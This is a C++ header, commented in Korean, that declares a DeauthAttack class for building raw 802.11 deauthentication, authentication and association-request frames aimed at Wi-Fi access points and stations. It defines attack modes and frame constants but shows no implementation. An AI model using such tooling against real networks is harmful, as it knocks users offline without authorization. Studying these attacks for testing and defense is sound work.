#include "pch.h"
#include "wlanhdr.h"

const int DEAUTH_ATTACK_AP_TO_BROADCAST = 0;
const int DEAUTH_ATTACK_AP_TO_STATION = 1;
const int DEAUTH_ATTACK_STATION_TO_AP = 2;
const int AUTH_ATTTACK_STATION_TO_AP_AUTH = 3;
const int AUTH_ATTTACK_STATION_TO_AP_ASSO_REQ = 4;

const uint16_t ASSO_REQ_FRAME = 0x0000;
const uint16_t AUTH_FRAME = 0x00b0;
const uint16_t DEAUTH_FRAME = 0x00c0;
const uint16_t HANDSHAKE_TIMEOUT = 0x000f;
const uint16_t CLASS3_NONASSOCIATED_STA = 0x0007;


/**
 * @brief 클래스 DeauthAttack가 반환할 공격 패킷 관련 정보를 정의한 구조체.
 *  packet: 패킷 데이터.
 *  size: 패킷 크기.
*/
typedef struct WLAN_DEAUTH_ATTACK_PAKCET {
    u_char* packet;
    uint64_t size;
} __attribute__((__packed__)) wlan_attack_pkt;
typedef wlan_attack_pkt wlan_auth_pkt;


/**
 * @brief Deauth attack 패킷 생성용 클래스.
*/
class DeauthAttack
{
private:
    int mode;

    const uint8_t* ap_mac_addr;
    const uint8_t* st_mac_addr;

    static const dot11_radiotap_hdr rtap_hdr;
    dot11_deauth_fhdr deauth_fhdr;
    dot11_wlm_auth_hdr wlm_auth_hdr;
    dot11_wlm_deauth_hdr wlm_deauth_hdr;
    dot11_wlm_asso_req_hdr wlm_asso_req_hdr;

    /**
     * @brief 공격 유형별 패킷 조립 작업 할당.
     * 
     * @return wlan_attack_pkt* 조립된 공격 패킷.
     */
    wlan_attack_pkt* assemble_pkt();

    /**
     * @brief Authentication 공격을 위한 authentication 패킷 조립.
     * 
     * @return wlan_attack_pkt* 조립된 authentication 패킷.
     */
    wlan_attack_pkt* assemble_auth_attack_auth_pkt();

    /**
     * @brief Authentication 공격을 위한 association request 패킷 조립.
     * 
     * @return wlan_attack_pkt* 조립된 association request 패킷.
     * 
     * @ref 실제 패킷을 바탕으로 Tagged parameters를 임의로 설정.
     *  SSID parameter, Supported Rates, Extended supported Rates.
     */
    wlan_attack_pkt* assemble_auth_attack_asso_req_pkt();

    /**
     * @brief Deauthentication 공격을 위한 패킷 조립.
     * 
     * @return wlan_attack_pkt* 조립된 deauthentication 패킷.
     */
    wlan_attack_pkt* assemble_deauth_attack_pkt();

    /**
     * @brief 공격 유형별 패킷 초기화.
     */
    void init_pkt();

public:
    /**
     * @brief 생성자.
     * 
     * @param ap_mac_addr AP MAC 주소.
     * @param st_mac_addr Station MAC 주소.
     * 
     * @ref st_mac_addr가 nullptr인 경우, st_mac_addr에 broadcast 주소 할당.
     */
    DeauthAttack(const uint8_t* ap_mac_addr, const uint8_t* st_mac_addr);
    ~DeauthAttack();

    /**
     * @brief 공격 유형별 패킷 가져오기.
     * 
     * @param mode 공격 유형.
     *  deauthentication + broadcast = DEAUTH_ATTACK_AP_TO_BROADCAST
     *  deauthentication + unicast(AP -> station) = DEAUTH_ATTACK_AP_TO_STATION
     *  deauthentication + unicast(station -> AP) = DEAUTH_ATTACK_STATION_TO_AP
     *  authentication + unicast(station -> AP) && authentication = AUTH_ATTTACK_STATION_TO_AP_AUTH
     *  authentication + unicast(station -> AP) && association request = AUTH_ATTTACK_STATION_TO_AP_ASSO_REQ
     * 
     * @return wlan_attack_pkt* 임의로 정의한 공격 유형별 패킷 구조체.
     */
    wlan_attack_pkt* get_pkt(const int mode);
};
